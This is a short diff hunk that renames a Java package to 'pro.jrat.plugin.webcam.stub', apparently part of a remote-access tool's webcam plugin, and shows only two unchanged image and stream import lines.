@@ -1,4 +1,4 @@
-package pro.jrat.plugin.stub;
+package pro.jrat.plugin.webcam.stub;
 
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayOutputStream;
